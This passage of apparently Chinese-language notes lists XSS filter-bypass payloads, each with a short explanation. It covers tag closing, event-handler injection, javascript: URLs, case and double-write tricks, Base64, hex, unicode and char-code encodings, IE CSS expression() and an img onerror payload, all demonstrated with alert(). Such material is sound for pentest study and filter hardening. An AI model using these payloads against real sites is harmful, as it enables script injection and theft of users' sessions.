...
分隔符绕过，某些分隔符会让后面的字符串变成新的属性，例如：`<input type="text" name="p1" value="xss">` ,:;onmousemove="alert(6)"，生成了onmousemove=""属性
...
xss"><script>alert(6)</script>				标签闭合，即可插入 js 标签：<input type="text" name="p1" value="xss"><script>alert(6)</script>

xss" onmousemove="alert(6)">				input 事件绕过，很多标签过滤了 <> 可以通过插入事件绕过（input 中若过滤了 "" 则肯定无法绕过）：<input type="text" name="p1" value="xss" onmousemove="alert(6)">">

javascript:alert(6)					href 伪协议绕过，可以将 URL 地址指向一个伪协议：<a href="javascript:alert(6)">javascript:alert(6)</a>

javajavascriptscript					双写绕过，有的过滤规则是将 javascript 或 script 替换为空

jaVaScRipT					大小写绕过，有的过滤规则无法识别大小写

<script>eval(atob("YWxlcnQoNik="))</script>		atob 解 Base64 编码绕过

<a href="javasc&#09;ript:alert(6)">xss</a>		Tab HTML 实体编号绕过，有的过滤规则是将 javascript 转义为 javaxscript ，可以利用 Tab HTML 实体编号绕过

style="background-image:url(javascript:alert(6))"		IE 浏览器 input 标签 style 属性伪协议绕过

hello:expression(alert(6))				IE 浏览器的 expression 绕过

hello:expr/**/ession(alert(6))				css 层叠样式表注释会替换为空

\\x3cscript\\x3ealert(6);\\x3c/script\\x3e			尖括号的十六进制编码绕过

js 中的编码 <script></script>
解码后执行

ascii		eval(String.fromCharCode(97,108,101,114,116,40,49,41))	alert(1)

base64		eval(atob("YWxlcnQoMSk="))				alert(1)

无需解码直接执行

hex		eval("\x61\x6c\x65\x72\x74\x28\x31\x29")			eval(alert(1))

unicode		\u0061\u006c\u0065\u0072\u0074("\u0031")		alert(1)
...
<img/src/onerror=location="javascript:alert(1)">		伪协议绕过(空格可以用 / 代替
)
